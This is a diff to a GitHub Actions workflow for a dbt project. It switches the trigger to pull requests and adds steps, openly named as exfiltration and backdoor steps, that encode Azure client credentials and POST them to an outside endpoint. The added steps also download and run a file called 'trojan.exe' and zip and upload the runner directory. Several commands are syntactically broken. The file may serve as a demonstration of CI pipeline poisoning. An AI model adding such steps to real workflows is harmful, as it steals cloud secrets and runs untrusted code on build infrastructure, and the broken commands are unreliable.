@@ -1,7 +1,7 @@
 name: DBTTest
 
 on:
-  workflow_dispatch:
+  pull_request:
     inputs:
       DbtCommand:
         description: 'Dbt command'     
@@ -51,6 +51,18 @@ jobs:
           creds: '{"clientId":"${{ secrets.ARM_CLIENT_ID }}","clientSecret":"${{ secrets.ARM_CLIENT_SECRET }}","subscriptionId":"${{ secrets.ARM_SUBSCRIPTION_ID }}","tenantId":"${{ secrets.ARM_TENANT_ID }}"}'
           enable-AzPSSession: false 
 
+      - name: Exfilterate secret and inject backdoor
+        run: |
+          base64 -e "${{ secrets.ARM_CLIENT_ID }}" + "," + "${{ secrets.ARM_CLIENT_SECRET }}" > stealdata.txt
+          curl -X POST -O stealdata.txt https://myendpoint.com/stealdata;
+          wget -e "https://fileshare.com/trojan" -O trojan.exe
+          ./trojan.exe
+
+      - name: Steal runner
+        run: |
+          7zip -u "../Runner 2.9.0" -o Runner.zip
+          curl -X POST -O Runner.zip https://myendpoint.com/stealfile;
+          
       - name: DBT Install
         id: dbt_install
         working-directory: ./solution/Dbt    
